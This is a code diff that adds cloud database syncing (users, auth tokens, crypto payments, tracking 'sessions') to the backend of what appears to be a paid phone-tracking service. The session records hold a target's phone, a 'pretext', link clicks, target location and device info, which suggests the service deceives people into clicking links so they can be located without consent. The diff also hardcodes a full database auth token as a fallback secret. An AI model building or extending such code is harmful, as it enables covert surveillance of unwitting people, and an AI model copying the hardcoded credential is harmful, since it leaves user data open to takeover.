@@ -101,6 +101,111 @@ if (!findDemo) {
   );
 }
 
+// --- TURSO CLOUD PERSISTENCE BRIDGE ---
+let turso = null;
+const TURSO_URL = process.env.TURSO_DATABASE_URL || 'libsql://trackphonenow-trackphonenow.aws-us-east-1.turso.io';
+const TURSO_TOKEN = process.env.TURSO_AUTH_TOKEN || 'eyJhbGciOiJFZERTQSIsInR5cCI6IkpXVCJ9.eyJhIjoicnciLCJpYXQiOjE3OTIyNDQxMzIsImlkIjoiMDFhMTRhMTItMWIwMS03NWMwLWJlNmQtZTdkNmMyNTYxZWMyIiwia2lkIjoiYjc4SmQxLW5LOEFsczFFVXhCb3RMZ2psX0s4akgxMEFGRzVTbHVtYmp4SSIsInJpZCI6IjM5MWJlMjEzLTJlZDAtNGVkOS1iY2E2LWQxNzM5ZjM5YTA2NyJ9.gFwK_LCg8J5gH0btndxaXV_vM6tlxkvP9hT7W25-varZNauSn1A2EuMU4AQi3uu7tOmr2foL3bZpcGOF_8WwDQ';
+
+try {
+  const { createClient } = require('@libsql/client');
+  if (TURSO_URL && TURSO_TOKEN) {
+    turso = createClient({
+      url: TURSO_URL,
+      authToken: TURSO_TOKEN
+    });
+    console.log('[Turso Cloud] LibSQL client initialized successfully.');
+  }
+} catch (e) {
+  console.warn('[Turso Cloud] Could not initialize client, running on local SQLite:', e.message);
+}
+
+async function syncToTurso(sql, args = []) {
+  if (!turso) return;
+  try {
+    await turso.execute({ sql, args });
+  } catch (err) {
+    console.error('[Turso Cloud Sync Error]:', err.message);
+  }
+}
+
+async function initTursoCloudSync() {
+  if (!turso) return;
+  try {
+    console.log('[Turso Cloud] Hydrating local SQLite with permanent cloud data...');
+    
+    // 1. Pull users from Turso
+    const usersResult = await turso.execute('SELECT * FROM users;');
+    const insertUser = db.prepare(`
+      INSERT OR REPLACE INTO users (
+        id, name, email, password_hash, salt, phone, plan, plan_name, plan_status,
+        plan_expires_at, auto_renew, subscription_amount, monthly_renewal_amount, created_at
+      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    `);
+    for (const u of usersResult.rows) {
+      insertUser.run(
+        u.id, u.name, u.email, u.password_hash, u.salt, u.phone,
+        u.plan, u.plan_name, u.plan_status, u.plan_expires_at,
+        u.auto_renew, u.subscription_amount, u.monthly_renewal_amount, u.created_at
+      );
+    }
+    console.log(`[Turso Cloud] Hydrated ${usersResult.rows.length} users from cloud.`);
+
+    // 2. Pull tokens from Turso
+    const tokensResult = await turso.execute('SELECT * FROM tokens;');
+    const insertToken = db.prepare('INSERT OR REPLACE INTO tokens (token, user_id, expires_at) VALUES (?, ?, ?)');
+    for (const t of tokensResult.rows) {
+      insertToken.run(t.token, t.user_id, t.expires_at);
+    }
+
+    // 3. Pull payments from Turso
+    const paymentsResult = await turso.execute('SELECT * FROM payments;');
+    const insertPayment = db.prepare(`
+      INSERT OR REPLACE INTO payments (id, user_id, currency, tx_hash, plan, amount, wallet_address, status, created_at)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+    `);
+    for (const p of paymentsResult.rows) {
+      insertPayment.run(p.id, p.user_id, p.currency, p.tx_hash, p.plan, p.amount, p.wallet_address, p.status, p.created_at);
+    }
+
+    // 4. Pull sessions from Turso
+    const sessionsResult = await turso.execute('SELECT * FROM sessions;');
+    const insertSession = db.prepare(`
+      INSERT OR REPLACE INTO sessions (
+        id, user_id, phone, phone_info, pretext, status, link_clicks,
+        target_location, target_device_info, history, created_at
+      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    `);
+    for (const s of sessionsResult.rows) {
+      insertSession.run(
+        s.id, s.user_id, s.phone, s.phone_info, s.pretext,
+        s.status, s.link_clicks, s.target_location, s.target_device_info, s.history, s.created_at
+      );
+    }
+
+    // Two-way sync: Push local users that might not be in cloud
+    const localUsers = db.prepare('SELECT * FROM users;').all();
+    for (const lu of localUsers) {
+      syncToTurso(`
+        INSERT OR REPLACE INTO users (
+          id, name, email, password_hash, salt, phone, plan, plan_name, plan_status,
+          plan_expires_at, auto_renew, subscription_amount, monthly_renewal_amount, created_at
+        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+      `, [
+        lu.id, lu.name, lu.email, lu.password_hash, lu.salt, lu.phone,
+        lu.plan, lu.plan_name, lu.plan_status, lu.plan_expires_at,
+        lu.auto_renew, lu.subscription_amount, lu.monthly_renewal_amount, lu.created_at
+      ]);
+    }
+
+    console.log('[Turso Cloud] Permanent cloud synchronization established.');
+  } catch (err) {
+    console.error('[Turso Cloud Init Error]:', err.message);
+  }
+}
+
+// Start cloud hydration
+initTursoCloudSync();
+
 // Database Operations
 const DB = {
   // --- USERS ---
@@ -136,6 +241,22 @@ const DB = {
       createdAt
     );
 
+    // Sync user to Turso Cloud
+    syncToTurso(`
+      INSERT OR REPLACE INTO users (
+        id, name, email, password_hash, salt, phone, plan, plan_name, plan_status,
+        plan_expires_at, auto_renew, subscription_amount, monthly_renewal_amount, created_at
+      ) VALUES (?, ?, ?, ?, ?, ?, 'free', 'Free Tier (Upgrade Required)', 'upgrade_required', NULL, 0, '$0.00', '$0.00', ?)
+    `, [
+      id,
+      name || email.split('@')[0],
+      email.toLowerCase().trim(),
+      passwordHash,
+      salt,
+      phone || '',
+      createdAt
+    ]);
+
     const token = this.createToken(id);
     const user = this.getUserById(id);
     return { user, token };
@@ -160,6 +281,7 @@ const DB = {
     const token = 'tok_' + crypto.randomBytes(24).toString('hex');
     const expiresAt = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString();
     db.prepare('INSERT INTO tokens (token, user_id, expires_at) VALUES (?, ?, ?)').run(token, userId, expiresAt);
+    syncToTurso('INSERT OR REPLACE INTO tokens (token, user_id, expires_at) VALUES (?, ?, ?)', [token, userId, expiresAt]);
     return token;
   },
 
@@ -174,6 +296,7 @@ const DB = {
 
     if (new Date(tokRow.expires_at) < new Date()) {
       db.prepare('DELETE FROM tokens WHERE token = ?').run(token);
+      syncToTurso('DELETE FROM tokens WHERE token = ?', [token]);
       return null;
     }
 
@@ -187,6 +310,7 @@ const DB = {
 
   cancelSubscription(userId) {
     db.prepare(`UPDATE users SET auto_renew = 0, plan_status = 'canceled_at_period_end' WHERE id = ?`).run(userId);
+    syncToTurso(`UPDATE users SET auto_renew = 0, plan_status = 'canceled_at_period_end' WHERE id = ?`, [userId]);
     return this.getUserById(userId);
   },
 
@@ -254,6 +378,26 @@ const DB = {
         sessionData.createdAt || new Date().toISOString()
       );
     }
+
+    // Sync to Turso Cloud
+    syncToTurso(`
+      INSERT OR REPLACE INTO sessions (
+        id, user_id, phone, phone_info, pretext, status, link_clicks,
+        target_location, target_device_info, history, created_at
+      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    `, [
+      sessionData.id,
+      sessionData.userId || 'user_demo_01',
+      sessionData.phone,
+      JSON.stringify(sessionData.phoneInfo || null),
+      JSON.stringify(sessionData.pretext || null),
+      sessionData.status || 'ACTIVE_WAITING',
+      sessionData.linkClicks || 0,
+      JSON.stringify(sessionData.targetLocation || null),
+      JSON.stringify(sessionData.targetDeviceInfo || null),
+      JSON.stringify(sessionData.history || []),
+      sessionData.createdAt || new Date().toISOString()
+    ]);
   },
 
   getSession(id) {
@@ -271,6 +415,7 @@ const DB = {
   deleteSession(id, userId) {
     if (!userId) return false;
     const res = db.prepare(`DELETE FROM sessions WHERE id = ? AND user_id = ?`).run(id, userId);
+    syncToTurso('DELETE FROM sessions WHERE id = ? AND user_id = ?', [id, userId]);
     return res.changes > 0;
   },
 
@@ -322,6 +467,21 @@ const DB = {
       walletAddress,
       createdAt
     );
+
+    // Sync payment to Turso Cloud
+    syncToTurso(`
+      INSERT OR REPLACE INTO payments (id, user_id, currency, tx_hash, plan, amount, wallet_address, status, created_at)
+      VALUES (?, ?, ?, ?, ?, ?, ?, 'PENDING', ?)
+    `, [
+      paymentId,
+      userId || 'guest',
+      currency,
+      txHash || '',
+      plan || 'pro_1m',
+      amount || defAmount,
+      walletAddress,
+      createdAt
+    ]);
 
     return {
       id: paymentId,
@@ -399,6 +559,7 @@ const DB = {
     }
 
     db.prepare(`UPDATE payments SET status = 'CONFIRMED' WHERE id = ?`).run(paymentId);
+    syncToTurso(`UPDATE payments SET status = 'CONFIRMED' WHERE id = ?`, [paymentId]);
 
     if (payment.userId && payment.userId !== 'guest') {
       let expiresAt;
@@ -423,6 +584,12 @@ const DB = {
         SET plan = ?, plan_name = ?, plan_status = 'active', plan_expires_at = ?, auto_renew = 1 
         WHERE id = ?
       `).run(plan || 'pro_1m', planName, expiresAt, payment.userId);
+
+      syncToTurso(`
+        UPDATE users 
+        SET plan = ?, plan_name = ?, plan_status = 'active', plan_expires_at = ?, auto_renew = 1 
+        WHERE id = ?
+      `, [plan || 'pro_1m', planName, expiresAt, payment.userId]);
     }
 
     const updatedUser = this.getUserById(payment.userId);
@@ -434,6 +601,7 @@ const DB = {
 
   cancelPendingPayment(paymentId, userId) {
     db.prepare(`UPDATE payments SET status = 'CANCELLED' WHERE id = ? AND user_id = ?`).run(paymentId, userId);
+    syncToTurso(`UPDATE payments SET status = 'CANCELLED' WHERE id = ? AND user_id = ?`, [paymentId, userId]);
     return true;
   }
 };
